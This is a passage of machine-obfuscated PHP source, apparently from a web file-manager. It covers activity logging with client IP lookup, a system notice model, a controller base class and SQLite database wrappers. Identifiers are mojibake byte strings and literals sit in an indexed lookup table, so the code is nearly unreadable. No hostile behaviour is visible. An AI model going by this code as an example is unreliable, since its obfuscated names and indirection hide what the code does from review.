LNG($ˆŞé¡í‡[2111]), $ˆŞé¡í‡[2112] => LNG($ˆŞé¡í‡[2113]), $ˆŞé¡í‡[2114] => LNG($ˆŞé¡í‡[2115]), $ˆŞé¡í‡[2116] => LNG($ˆŞé¡í‡[2116]), $ˆŞé¡í‡[2117] => LNG($ˆŞé¡í‡[1694]), $ˆŞé¡í‡[2118] => LNG($ˆŞé¡í‡[2119]), $ˆŞé¡í‡[2120] => LNG($ˆŞé¡í‡[2121]), $ˆŞé¡í‡[2122] => LNG($ˆŞé¡í‡[2123]), $ˆŞé¡í‡[2124] => LNG($ˆŞé¡í‡[2125]), $ˆŞé¡í‡[2126] => LNG($ˆŞé¡í‡[2127]), $ˆŞé¡í‡[2128] => LNG($ˆŞé¡í‡[2128]), $ˆŞé¡í‡[2129] => LNG($ˆŞé¡í‡[2130]), $ˆŞé¡í‡[2131] => LNG($ˆŞé¡í‡[2132]), $ˆŞé¡í‡[2133] => LNG($ˆŞé¡í‡[2134]), $ˆŞé¡í‡[2135] => LNG($ˆŞé¡í‡[2136]), $ˆŞé¡í‡[2137] => LNG($ˆŞé¡í‡[2138]), $ˆŞé¡í‡[2139] => LNG($ˆŞé¡í‡[2140])); } private function typeFile() { $äÊâ‹ì© =& $_SERVER[Ù×¯Ø…]; $ ¬ã‹ñÖ = array($äÊâ‹ì©[1725] => array($äÊâ‹ì©[1726]), $äÊâ‹ì©[2082] => array($äÊâ‹ì©[2141]), $äÊâ‹ì©[2084] => array($äÊâ‹ì©[2142]), $äÊâ‹ì©[1718] => array($äÊâ‹ì©[1719]), $äÊâ‹ì©[2092] => array(), $äÊâ‹ì©[2094] => array(), $äÊâ‹ì©[2096] => array(), $äÊâ‹ì©[1728] => array($äÊâ‹ì©[1730]), $äÊâ‹ì©[1729] => array($äÊâ‹ì©[1730]), $äÊâ‹ì©[2100] => array($äÊâ‹ì©[2143]), $äÊâ‹ì©[2102] => array($äÊâ‹ì©[2143]), $äÊâ‹ì©[2104] => array($äÊâ‹ì©[2144]), $äÊâ‹ì©[2090] => array($äÊâ‹ì©[2145]), $äÊâ‹ì©[1723] => array($äÊâ‹ì©[2146]), $äÊâ‹ì©[2107] => array($äÊâ‹ì©[2147]), $äÊâ‹ì©[1722] => array($äÊâ‹ì©[1724])); return $ ¬ã‹ñÖ; } private function typeAll() { $ÒôĞ©€ä =& $_SERVER[Ù×¯Ø…]; $‡ƒÎ×ïÄ = $this->typeList; $Íğ«å²Ö = array_filter($this->typeFile()); foreach ($Íğ«å²Ö as $ÌåØÏÉ => $·ÊÙÎÔü) { $‡ƒÎ×ïÄ[$·ÊÙÎÔü[0]] = $‡ƒÎ×ïÄ[$ÌåØÏÉ]; } $‡ƒÎ×ïÄ[$ÒôĞ©€ä[1730]] = LNG($ÒôĞ©€ä[2148]); $‡ƒÎ×ïÄ[$ÒôĞ©€ä[2143]] = LNG($ÒôĞ©€ä[2149]); return $‡ƒÎ×ïÄ; } public function addLog($­äÏ², $¹™¼‘Ğ¢ = array()) { $†¨ë‚Â¦ =& $_SERVER[Ù×¯Ø…]; if (!isset($this->typeList[$­äÏ²])) { return; } $‚´şşõ = defined($†¨ë‚Â¦[477]) && USER_ID ? USER_ID : (isset($¹™¼‘Ğ¢[$†¨ë‚Â¦[1580]]) ? $¹™¼‘Ğ¢[$†¨ë‚Â¦[1580]] : 0); if (!$‚´şşõ) { $‚´şşõ = (int) Session::get($†¨ë‚Â¦[1882]); } $ËÊ†›â = get_client_ip(); if (!$¹™¼‘Ğ¢ || strlen(json_encode($¹™¼‘Ğ¢)) >= 1024) { $¹™¼‘Ğ¢ = array($†¨ë‚Â¦[2150] => $ËÊ†›â); } else { if (is_array($¹™¼‘Ğ¢)) { $¹™¼‘Ğ¢[$†¨ë‚Â¦[2150]] = $ËÊ†›â; } else { $¹™¼‘Ğ¢ = array($†¨ë‚Â¦[1123] => $¹™¼‘Ğ¢, $†¨ë‚Â¦[2150] => $ËÊ†›â); } } $¹™¼‘Ğ¢ = array($†¨ë‚Â¦[1570] => Session::sign(), $†¨ë‚Â¦[1571] => $‚´şşõ, $†¨ë‚Â¦[29] => $­äÏ², $†¨ë‚Â¦[1573] => json_encode($¹™¼‘Ğ¢)); parent::add($¹™¼‘Ğ¢); } public function remove($ÇÁ°ªƒˆ) { $this->where(array($_SERVER[Ù×¯Ø…][423] => $ÇÁ°ªƒˆ))->delete(); } private function _makeOrder($©è²Ï‘¥ = '') { $àûÊ‹„— =& $_SERVER[Ù×¯Ø…]; $‚ÌÄû² = $àûÊ‹„—[194]; $ñÊ½Óèş = array($àûÊ‹„—[451] => $àûÊ‹„—[452], $àûÊ‹„—[453] => $àûÊ‹„—[454]); $îÇÌû™¹ = Input::get($àûÊ‹„—[459], $àûÊ‹„—[7], $àûÊ‹„—[1914], array($àûÊ‹„—[1838], $àûÊ‹„—[453])); $îÇÌû™¹ = $ñÊ½Óèş[$îÇÌû™¹]; $©è²Ï‘¥ = $©è²Ï‘¥ . "{$‚ÌÄû²}\40{$îÇÌû™¹}"; return $this->order($©è²Ï‘¥); } public function get($šÂÂÚÓÈ = '') { $ÒĞš×Èã =& $_SERVER[Ù×¯Ø…]; if (!$šÂÂÚÓÈ) { show_json(array()); } $¼Î°Ò×‘ = array(); if ($šÂÂÚÓÈ[$ÒĞš×Èã[1580]]) { $¼Î°Ò×‘[$ÒĞš×Èã[1580]] = $šÂÂÚÓÈ[$ÒĞš×Èã[1580]]; } if (isset($šÂÂÚÓÈ[$ÒĞš×Èã[760]])) { $ÑşŸÛ˜¦ = $šÂÂÚÓÈ[$ÒĞš×Èã[760]]; $²Ï³­çñ = isset($šÂÂÚÓÈ[$ÒĞš×Èã[499]]) ? $šÂÂÚÓÈ[$ÒĞš×Èã[499]] : time(); $¼Î°Ò×‘[$ÒĞš×Èã[194]] = array($ÒĞš×Èã[331], array($ÑşŸÛ˜¦, $²Ï³­çñ)); } if ($šÂÂÚÓÈ[$ÒĞš×Èã[29]]) { $­¿Êİ’˜ = explode($ÒĞš×Èã[47], $šÂÂÚÓÈ[$ÒĞš×Èã[29]]); $¦àØ»™¡ = $this->typeFile(); $úØÕãù© = array(); foreach ($­¿Êİ’˜ as $ÅÓÄÀœ) { $úØÕãù©[] = $ÅÓÄÀœ; if (isset($¦àØ»™¡[$ÅÓÄÀœ])) { $úØÕãù© = array_merge($úØÕãù©, $¦àØ»™¡[$ÅÓÄÀœ]); } } $úØÕãù© = array_unique($úØÕãù©); if ($úØÕãù©) { $¼Î°Ò×‘[$ÒĞš×Èã[29]] = array($ÒĞš×Èã[7], $úØÕãù©); } } else { $¼Î°Ò×‘[$ÒĞš×Èã[29]] = array($ÒĞš×Èã[2151], $ÒĞš×Èã[2152]); } if (!empty($šÂÂÚÓÈ[$ÒĞš×Èã[2150]])) { $¼Î°Ò×‘[$ÒĞš×Èã[454]] = array($ÒĞš×Èã[381], "\45{$šÂÂÚÓÈ[$ÒĞš×Èã[2150]]}\45"); } $Ê˜ÜÀ = $this->_makeOrder()->where($¼Î°Ò×‘)->selectPage(); if (empty($Ê˜ÜÀ[$ÒĞš×Èã[367]])) { show_json(array(), !0, $Ê˜ÜÀ[$ÒĞš×Èã[364]]); } $Ê˜ÜÀ[$ÒĞš×Èã[367]] = $this->logList($Ê˜ÜÀ[$ÒĞš×Èã[367]]); return $Ê˜ÜÀ; } private function ipAddress(&$•ğ«²) { $„ó±Ğ¬ =& $_SERVER[Ù×¯Ø…]; if (!empty($•ğ«²[$„ó±Ğ¬[2150]])) { $è¿ÚÏ = IpLocation::get($•ğ«²[$„ó±Ğ¬[2150]]); } else { $è¿ÚÏ = LNG($„ó±Ğ¬[2153]); } $•ğ«²[$„ó±Ğ¬[2154]] = $è¿ÚÏ; } private function descZipDownload($ïÑ£Áä , &$¢İ©Ó²Ò) { $ş şËİİ =& $_SERVER[Ù×¯Ø…]; if (!isset($ïÑ£Áä [$ş şËİİ[2155]])) { return; } $ÈóŒÛÔ£ = json_decode($ïÑ£Áä [$ş şËİİ[2155]], !0); foreach ($ÈóŒÛÔ£ as $¦³Œ©ôÀ) { try { $‘¨È¬¼¾ = IO::infoFull($¦³Œ©ôÀ[$ş şËİİ[76]]); } catch (Exception $ÙãÀŒ÷) { continue; } $ïÑ£Áä [$ş şËİİ[76]] = $¦³Œ©ôÀ[$ş şËİİ[76]]; $¢İ©Ó²Ò[] = $ïÑ£Áä [$ş şËİİ[406]] = $‘¨È¬¼¾[$ş şËİİ[406]]; $¢İ©Ó²Ò[] = $ïÑ£Áä [$ş şËİİ[1968]] = $‘¨È¬¼¾[$ş şËİİ[501]]; break; } return $ïÑ£Áä ; } private function getSourceList(&$Ç‚íèÕ) { $‘¾­…×ù =& $_SERVER[Ù×¯Ø…]; $ÂÖ±ÔÊ§ = array(); foreach ($Ç‚íèÕ as $ıƒçşû => $ñ©â»ş) { $¶·‹—‹ = json_decode($ñ©â»ş[$‘¾­…×ù[454]], !0); if ($ñ©â»ş[$‘¾­…×ù[29]] == $‘¾­…×ù[1721]) { $¶·‹—‹ = $this->descZipDownload($¶·‹—‹, $ÂÖ±ÔÊ§); $Ç‚íèÕ[$ıƒçşû][$‘¾­…×ù[454]] = json_encode($¶·‹—‹); continue; } if (strpos($ñ©â»ş[$‘¾­…×ù[29]], $‘¾­…×ù[1969]) !== 0) { if (!isset($¶·‹—‹[$‘¾­…×ù[76]]) || strpos($ñ©â»ş[$‘¾­…×ù[29]], $‘¾­…×ù[2156]) !== 0) { continue; } try { $Ù¥úèõà = IO::infoFull($¶·‹—‹[$‘¾­…×ù[76]]); } catch (Exception $©´ ê) { continue; } $ÂÖ±ÔÊ§[] = $¶·‹—‹[$‘¾­…×ù[406]] = $Ù¥úèõà[$‘¾­…×ù[406]]; $ÂÖ±ÔÊ§[] = $¶·‹—‹[$‘¾­…×ù[1968]] = $Ù¥úèõà[$‘¾­…×ù[501]]; $Ç‚íèÕ[$ıƒçşû][$‘¾­…×ù[454]] = json_encode($¶·‹—‹); continue; } $ÂÖ±ÔÊ§[] = $¶·‹—‹[$‘¾­…×ù[406]]; $ÂÖ±ÔÊ§[] = $¶·‹—‹[$‘¾­…×ù[1968]]; if ($¶·‹—‹[$‘¾­…×ù[29]] == $‘¾­…×ù[554]) { $ÂÖ±ÔÊ§[] = $¶·‹—‹[$‘¾­…×ù[454]][$‘¾­…×ù[1090]]; $ÂÖ±ÔÊ§[] = $¶·‹—‹[$‘¾­…×ù[454]][$‘¾­…×ù[1091]]; } if ($¶·‹—‹[$‘¾­…×ù[29]] == $‘¾­…×ù[1976]) { $ÂÖ±ÔÊ§[] = $¶·‹—‹[$‘¾­…×ù[454]][$‘¾­…×ù[406]]; } } if (!$ÂÖ±ÔÊ§) { return array(); } return Model($‘¾­…×ù[831])->sourceListInfo($ÂÖ±ÔÊ§, !0); } private function logList($–‚—ñş¿) { $í’¿ó©€ =& $_SERVER[Ù×¯Ø…]; $Êíé­ÄÙ = array_to_keyvalue($–‚—ñş¿, $í’¿ó©€[33], $í’¿ó©€[1580]); $¤»İš• = Model($í’¿ó©€[541])->userListInfo(array_unique($Êíé­ÄÙ)); $ÆØ“Æ¨ = $this->getSourceList($–‚—ñş¿); $·íéñ = $this->typeAll(); $€‡©‚¸ = array(); $÷Ô¾Âî = array(); foreach ($–‚—ñş¿ as $ÂÇÍÎ¨ => $”ğµŠîè) { $¸ı¡şºÇ = $”ğµŠîè[$í’¿ó©€[29]]; $µØ’œÒğ = isset($¤»İš•[$”ğµŠîè[$í’¿ó©€[1580]]]) ? $¤»İš•[$”ğµŠîè[$í’¿ó©€[1580]]] : !1; $Å¨ş»­ö = strpos($¸ı¡şºÇ, $í’¿ó©€[2157]) === 0 ? LNG($í’¿ó©€[2158]) : LNG($í’¿ó©€[2153]); $”ğµŠîè[$í’¿ó©€[28]] = isset($µØ’œÒğ[$í’¿ó©€[28]]) ? $µØ’œÒğ[$í’¿ó©€[28]] : LNG($í’¿ó©€[2153]); $”ğµŠîè[$í’¿ó©€[2016]] = isset($µØ’œÒğ[$í’¿ó©€[2016]]) ? $µØ’œÒğ[$í’¿ó©€[2016]] : $í’¿ó©€[33]; $”ğµŠîè[$í’¿ó©€[1479]] = isset($·íéñ[$¸ı¡şºÇ]) ? $·íéñ[$¸ı¡şºÇ] : $Å¨ş»­ö; $”ğµŠîè[$í’¿ó©€[1913]] = $µØ’œÒğ; $·Ğêøş£ = json_decode($”ğµŠîè[$í’¿ó©€[454]], !0); $”ğµŠîè[$í’¿ó©€[2150]] = isset($·Ğêøş£[$í’¿ó©€[2150]]) ? $·Ğêøş£[$í’¿ó©€[2150]] : $í’¿ó©€[33]; $”ğµŠîè[$í’¿ó©€[2154]] = IpLocation::get($”ğµŠîè[$í’¿ó©€[2150]]); if (strpos($¸ı¡şºÇ, $í’¿ó©€[1969]) === 0 || isset($·Ğêøş£[$í’¿ó©€[1968]])) { $·Ğêøş£[$í’¿ó©€[85]] = $ÆØ“Æ¨[$·Ğêøş£[$í’¿ó©€[406]]]; $·Ğêøş£[$í’¿ó©€[1981]] = $ÆØ“Æ¨[$·Ğêøş£[$í’¿ó©€[1968]]]; if ($·Ğêøş£[$í’¿ó©€[29]] == $í’¿ó©€[554]) { $·Ğêøş£[$í’¿ó©€[454]][$í’¿ó©€[1090]] = $ÆØ“Æ¨[$·Ğêøş£[$í’¿ó©€[454]][$í’¿ó©€[1090]]]; $·Ğêøş£[$í’¿ó©€[454]][$í’¿ó©€[1091]] = $ÆØ“Æ¨[$·Ğêøş£[$í’¿ó©€[454]][$í’¿ó©€[1091]]]; } if ($·Ğêøş£[$í’¿ó©€[29]] == $í’¿ó©€[1976]) { $·Ğêøş£[$í’¿ó©€[454]][$í’¿ó©€[406]] = $ÆØ“Æ¨[$·Ğêøş£[$í’¿ó©€[454]][$í’¿ó©€[406]]]; } if ($·Ğêøş£[$í’¿ó©€[29]] == $í’¿ó©€[1716]) { $·Ğêøş£[$í’¿ó©€[1981]] = $·Ğêøş£[$í’¿ó©€[85]]; $·Ğêøş£[$í’¿ó©€[1968]] = $·Ğêøş£[$í’¿ó©€[1981]][$í’¿ó©€[406]]; $·Ğêøş£[$í’¿ó©€[85]] = !1; $·Ğêøş£[$í’¿ó©€[406]] = $í’¿ó©€[33]; } if ($·Ğêøş£[$í’¿ó©€[85]] && $·Ğêøş£[$í’¿ó©€[85]][$í’¿ó©€[415]] == $í’¿ó©€[1206]) { $÷Ô¾Âî[] = $”ğµŠîè[$í’¿ó©€[395]]; unset($–‚—ñş¿[$ÂÇÍÎ¨]); continue; } if ($·Ğêøş£[$í’¿ó©€[1981]] && $·Ğêøş£[$í’¿ó©€[1981]][$í’¿ó©€[415]] == $í’¿ó©€[1206]) { $÷Ô¾Âî[] = $”ğµŠîè[$í’¿ó©€[395]]; unset($–‚—ñş¿[$ÂÇÍÎ¨]); continue; } } $”ğµŠîè[$í’¿ó©€[454]] = $·Ğêøş£; unset($”ğµŠîè[$í’¿ó©€[2159]]); $€‡©‚¸[] = $”ğµŠîè; } $this->clearSystemPathLog($÷Ô¾Âî); return $€‡©‚¸; } private function clearSystemPathLog($ÖÆıï½) { $¹åâòÏˆ =& $_SERVER[Ù×¯Ø…]; if (count($ÖÆıï½) == 0) { return; } $ ºşÚÈ– = array($¹åâòÏˆ[395] => array($¹åâòÏˆ[7], array_unique($ÖÆıï½))); $this->where($ ºşÚÈ–)->delete(); } public function deviceList($•¾úíáü, $è·ˆÔñ¦ = 0) { $¶§«ğ€ô =& $_SERVER[Ù×¯Ø…]; $¦³Êœ§Ç = array($¶§«ğ€ô[1580] => $•¾úíáü, $¶§«ğ€ô[194] => array($¶§«ğ€ô[1010], $è·ˆÔñ¦), $¶§«ğ€ô[29] => $¶§«ğ€ô[1690]); $Ëæ‰£Áë = array(); $ä†×ÓÏ£ = $this->field($¶§«ğ€ô[2160])->where($¦³Êœ§Ç)->order($¶§«ğ€ô[1979])->limit(50)->select(); foreach ($ä†×ÓÏ£ as $‰¤•İÌ => $ò‘½ë±ƒ) { if ($‰¤•İÌ > 0 && abs($ò‘½ë±ƒ[$¶§«ğ€ô[194]] - $ä†×ÓÏ£[$‰¤•İÌ - 1][$¶§«ğ€ô[194]]) < 5) { continue; } $–¸û¸İ± = json_decode($ò‘½ë±ƒ[$¶§«ğ€ô[454]], !0); $ò‘½ë±ƒ[$¶§«ğ€ô[2150]] = isset($–¸û¸İ±[$¶§«ğ€ô[2150]]) ? $–¸û¸İ±[$¶§«ğ€ô[2150]] : $¶§«ğ€ô[33]; unset($–¸û¸İ±[$¶§«ğ€ô[2150]]); $ÔûÓä­ = $this->deviceType($–¸û¸İ±[$¶§«ğ€ô[1970]]); if (isset($Ëæ‰£Áë[$ÔûÓä­])) { continue; } $ò‘½ë±ƒ[$¶§«ğ€ô[2154]] = IpLocation::get($ò‘½ë±ƒ[$¶§«ğ€ô[2150]]); $ò‘½ë±ƒ[$¶§«ğ€ô[454]] = $–¸û¸İ±; $Ëæ‰£Áë[$ÔûÓä­] = $ò‘½ë±ƒ; } return array_values($Ëæ‰£Áë); } public function deviceType($ÇŒú¨ÂÃ) { return $ÇŒú¨ÂÃ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\156\157\164\151\143\145\114\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x63\x6f\x6e\x74\x65\156\164", "\141\165\164\x68", "\155\x6f\144\145", "\x74\x69\155\x65", "\x74\171\x70\145", "\x6c\x65\x76\145\x6c", "\x65\x6e\141\x62\154\145", "\163\157\x72\164"); public function listData($±œ‡õÊ™ = false, $•¤ãé€ø = "\163\x6f\162\164", $‚¯É³È = false) { return parent::listData($±œ‡õÊ™, $•¤ãé€ø, $‚¯É³È); } public function add($òŞï®§) { $ÌçÌÙâ =& $_SERVER[Ù×¯Ø…]; $ÎÁ¢Ä½á = time(); if ($òŞï®§[$ÌçÌÙâ[12]] == $ÌçÌÙâ[2161]) { $ÎÁ¢Ä½á = strtotime($òŞï®§[$ÌçÌÙâ[197]]); } $òŞï®§[$ÌçÌÙâ[197]] = $ÎÁ¢Ä½á; return parent::insert($òŞï®§); } public function update($µ³¶ë¹€, $»Äí³ä˜) { $ºÄØĞÏÔ =& $_SERVER[Ù×¯Ø…]; $Öéµäì = $this->listData($µ³¶ë¹€); if (!$Öéµäì) { return !1; } $Ç·™Õ = time(); if ($»Äí³ä˜[$ºÄØĞÏÔ[12]] == $ºÄØĞÏÔ[2161]) { $Ç·™Õ = strtotime($»Äí³ä˜[$ºÄØĞÏÔ[197]]); } $»Äí³ä˜[$ºÄØĞÏÔ[197]] = $Ç·™Õ; return parent::update($µ³¶ë¹€, $»Äí³ä˜); } public function remove($ç¾€ÂíÑ) { $œ×‘¿¤¦ = $this->listData($ç¾€ÂíÑ); if (!$œ×‘¿¤¦ || $œ×‘¿¤¦[$_SERVER[Ù×¯Ø…][1206]]) { return !1; } return parent::remove($ç¾€ÂíÑ); } public function sort($ü•¼ª±¥, $È¯›¶İ‡) { return parent::update($ü•¼ª±¥, $È¯›¶İ‡); } public function enable($å™„¾¼Ÿ, $şåŒ©ñŞ) { return parent::update($å™„¾¼Ÿ, array($_SERVER[Ù×¯Ø…][2162] => $şåŒ©ñŞ)); } private function initUserOption() { $¾ªË—¡ =& $_SERVER[Ù×¯Ø…]; $this->optionType = $¾ªË—¡[2163]; $this->modelType = $¾ªË—¡[2164]; $this->field = array($¾ªË—¡[2165], $¾ªË—¡[28], $¾ªË—¡[197], $¾ªË—¡[29], $¾ªË—¡[2166], $¾ªË—¡[749], $¾ªË—¡[189]); } public function userNoticeGet($ÏĞòò¾â = false) { $this->initUserOption(); return parent::listData($ÏĞòò¾â, $_SERVER[Ù×¯Ø…][395], !0); } public function userNoticeAdd($ØØ¡ ·º) { $êŠ™†¾Ó =& $_SERVER[Ù×¯Ø…]; $this->initUserOption(); $À›¿‚ÂÅ = $this->findByKey($êŠ™†¾Ó[2165], $ØØ¡ ·º[$êŠ™†¾Ó[395]]); if ($À›¿‚ÂÅ) { return !0; } $¢›¸ƒœÌ = array($êŠ™†¾Ó[2165] => $ØØ¡ ·º[$êŠ™†¾Ó[395]], $êŠ™†¾Ó[28] => $ØØ¡ ·º[$êŠ™†¾Ó[28]], $êŠ™†¾Ó[197] => $ØØ¡ ·º[$êŠ™†¾Ó[197]], $êŠ™†¾Ó[29] => isset($ØØ¡ ·º[$êŠ™†¾Ó[29]]) ? $ØØ¡ ·º[$êŠ™†¾Ó[29]] : 1, $êŠ™†¾Ó[2166] => isset($ØØ¡ ·º[$êŠ™†¾Ó[2166]]) ? $ØØ¡ ·º[$êŠ™†¾Ó[2166]] : 0, $êŠ™†¾Ó[749] => 0, $êŠ™†¾Ó[189] => 0); return parent::insert($¢›¸ƒœÌ); } public function userNoticeEdit($¥®÷©ÄŒ, $é¤Ş™‰‡) { $this->initUserOption(); return parent::update($¥®÷©ÄŒ, $é¤Ş™‰‡); } } goto AË…˜¬›ò; bùŞè‹­˜×: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÕôêıÃ­ =& $_SERVER[Ù×¯Ø…]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÕôêıÃ­[6]] =& $config; $this->values[$ÕôêıÃ­[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÕôêıÃ­[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¦²ß´›™) { if (1 === func_num_args()) { $this->{$¦²ß´›™} = new $¦²ß´›™(); } else { $›”äëÎ = new ReflectionClass($¦²ß´›™); $Á®áØºÎ = func_get_args(); array_shift($Á®áØºÎ); $this->{$¦²ß´›™} = $›”äëÎ->newInstanceArgs($Á®áØºÎ); } return $this->{$¦²ß´›™}; } protected function assign($‹‘¥şÊ½, $ûÉïš­Š) { $this->values[$‹‘¥şÊ½] = $ûÉïš­Š; } protected function display($˜›Š¢ù) { ob_end_clean(); extract($this->values); require $this->tpl . $˜›Š¢ù; } } class DbSqliteBase extends Db { public function __construct($–çÕäÃÉ = '') { $ô•¢•Ãµ =& $_SERVER[Ù×¯Ø…]; if (!extension_loaded($ô•¢•Ãµ[9])) { think_exception(think_lang($ô•¢•Ãµ[10]) . $ô•¢•Ãµ[11]); } if (!empty($–çÕäÃÉ)) { if (!isset($–çÕäÃÉ[$ô•¢•Ãµ[12]])) { $–çÕäÃÉ[$ô•¢•Ãµ[12]] = 438; } $this->config = $–çÕäÃÉ; if (empty($this->config[$ô•¢•Ãµ[13]])) { $this->config[$ô•¢•Ãµ[13]] = array(); } } } public function connect($„–µÃô– = '', $×”Ö÷–– = 0) { $˜ı‚îÚ =& $_SERVER[Ù×¯Ø…]; if (!isset($this->linkID[$×”Ö÷––])) { if (empty($„–µÃô–)) { $„–µÃô– = $this->config; } $¥¾ßÇ¾¼ = !empty($„–µÃô–[$˜ı‚îÚ[13]][$˜ı‚îÚ[14]]) ? $„–µÃô–[$˜ı‚îÚ[13]][$˜ı‚îÚ[14]] : $this->pconnect; $²ˆà‰µ© = $¥¾ßÇ¾¼ ? $˜ı‚îÚ[15] : $˜ı‚îÚ[16]; $this->linkID[$×”Ö÷––] = $²ˆà‰µ©($„–µÃô–[$˜ı‚îÚ[17]], $„–µÃô–[$˜ı‚îÚ[12]]); if (!$this->linkID[$×”Ö÷––]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$×”Ö÷––], 30000); if (1 != think_config($˜ı‚îÚ[18])) { unset($this->config); } } return $this->linkID[$×”Ö÷––]; } public function free() { $this->queryID = null; } public function query($ªÜôœí€) { $î«œô’¬ =& $_SERVER[Ù×¯Ø…]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ªÜôœí€; if ($this->queryID) { $this->free(); } think_action_status($î«œô’¬[19], 1); think_status($î«œô’¬[20]); $this->queryID = sqlite_query($this->_linkID, $ªÜôœí€); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $öÑ×İ÷ = $this->getAll(); return $öÑ×İ÷; } } public function execute($Æ·à¦) { $ßÇ±Ìµ =& $_SERVER[Ù×¯Ø…]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Æ·à¦; if ($this->queryID) { $this->free(); } think_action_status($ßÇ±Ìµ[21], 1); think_status($ßÇ±Ìµ[20]); $æÖâÆ¥Ç = sqlite_exec($this->_linkID, $Æ·à¦); $this->debug(); if (!1 === $æÖâÆ¥Ç) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ù×¯Ø…][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $õÊ²€éõ = sqlite_query($this->_linkID, $_SERVER[Ù×¯Ø…][23]); if (!$õÊ²€éõ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ô¤½éŸ« = sqlite_query($this->_linkID, $_SERVER[Ù×¯Ø…][24]); if (!$Ô¤½éŸ«) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÒôİÀ = array(); if ($this->numRows > 0) { for ($äİ˜Àè = 0; $äİ˜Àè < $this->numRows; $äİ˜Àè++) { $ÒôİÀ[$äİ˜Àè] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ÒôİÀ; } public function getFields($Ú­øÍ¶) { $‡òï·Š™ =& $_SERVER[Ù×¯Ø…]; $øÛ˜¾’ = $this->query($‡òï·Š™[25] . $Ú­øÍ¶ . $‡òï·Š™[26]); $é”®Œ‹ô = array(); if ($øÛ˜¾’) { foreach ($øÛ˜¾’ as $²´‚ò => $Î÷¢¬·­) { $é”®Œ‹ô[$Î÷¢¬·­[$‡òï·Š™[27]]] = array($‡òï·Š™[28] => $Î÷¢¬·­[$‡òï·Š™[27]], $‡òï·Š™[29] => $Î÷¢¬·­[$‡òï·Š™[30]], $‡òï·Š™[31] => (bool) ($Î÷¢¬·­[$‡òï·Š™[32]] === $‡òï·Š™[33]), $‡òï·Š™[34] => $Î÷¢¬·­[$‡òï·Š™[35]], $‡òï·Š™[36] => strtolower($Î÷¢¬·­[$‡òï·Š™[37]]) == $‡òï·Š™[38], $‡òï·Š™[39] => strtolower($Î÷¢¬·­[$‡òï·Š™[40]]) == $‡òï·Š™[41]); } } return $é”®Œ‹ô; } public function getTables($¼éò« = '') { $·œå¥ŞË =& $_SERVER[Ù×¯Ø…]; $Äûşö¾¹ = $this->query($·œå¥ŞË[42] . $·œå¥ŞË[43] . $·œå¥ŞË[44]); $§ÑéÓıÉ = array(); foreach ($Äûşö¾¹ as $êÒÀòıÈ => $Ş¦ï‹çÇ) { $§ÑéÓıÉ[$êÒÀòıÈ] = current($Ş¦ï‹çÇ); } return $§ÑéÓıÉ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $‡¦ƒ® =& $_SERVER[Ù×¯Ø…]; $ÒÚ¨ï™Û = sqlite_last_error($this->_linkID); $this->error = $ÒÚ¨ï™Û . $‡¦ƒ®[4] . sqlite_error_string($ÒÚ¨ï™Û); if ($‡¦ƒ®[33] != $this->queryStr) { $this->error .= LNG($‡¦ƒ®[45]) . $this->queryStr; } think_trace($this->error, $‡¦ƒ®[33], $‡¦ƒ®[46]); return $this->error; } public function escapeString($Ô˜ĞÌ½) { return sqlite_escape_string($Ô˜ĞÌ½); } public function parseLimit($€½èœğÌ) { $Ÿ£…¢™Â =& $_SERVER[Ù×¯Ø…]; $Æéà™ı‡ = $Ÿ£…¢™Â[33]; if (!empty($€½èœğÌ)) { $€½èœğÌ = explode($Ÿ£…¢™Â[47], $€½èœğÌ); if (count($€½èœğÌ) > 1) { $Æéà™ı‡ .= $Ÿ£…¢™Â[48] . $€½èœğÌ[1] . $Ÿ£…¢™Â[49] . $€½èœğÌ[0] . $Ÿ£…¢™Â[50]; } else { $Æéà™ı‡ .= $Ÿ£…¢™Â[48] . $€½èœğÌ[0] . $Ÿ£…¢™Â[50]; } } return $Æéà™ı‡; } } class DbSqlite3Base extends Db { public function __construct($ã¾‘ëë = '') { $’±È¨Ñô =& $_SERVER[Ù×¯Ø…]; if (!class_exists($’±È¨Ñô[51])) { think_exception(think_lang($’±È¨Ñô[10]) . $’±È¨Ñô[52]); } if (!empty($ã¾‘ëë)) { if (!isset($ã¾‘ëë[$’±È¨Ñô[12]])) { $ã¾‘ëë[$’±È¨Ñô[12]] = 438; } $this->config = $ã¾‘ëë; if (empty($this->config[$’±È¨Ñô[13]])) { $this->config[$’±È¨Ñô[13]] = array(); } } } public function connect($ûÀ¯ƒÛ· = '', $ßÜ†È Â = 0) { $©Õ©ç¨† =& $_SERVER[Ù×¯Ø…]; if (!isset($this->linkID[$ßÜ†È Â])) { if (empty($ûÀ¯ƒÛ·)) { $ûÀ¯ƒÛ· = $this->config; } $this->linkID[$ßÜ†È Â] = new SQLite3($ûÀ¯ƒÛ·[$©Õ©ç¨†[17]]); if (!$this->linkID[$ßÜ†È Â]) { think_exception($this->linkID[$ßÜ†È Â]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ßÜ†È Â]->busyTimeout(30000); if (1 != think_config($©Õ©ç¨†[18])) { unset($this->config); } } return $this->linkID[$ßÜ†È Â]; } public function free() { $this->queryID = null; } public function query($Üøå³¤Ü) { $É†¯Œİ =& 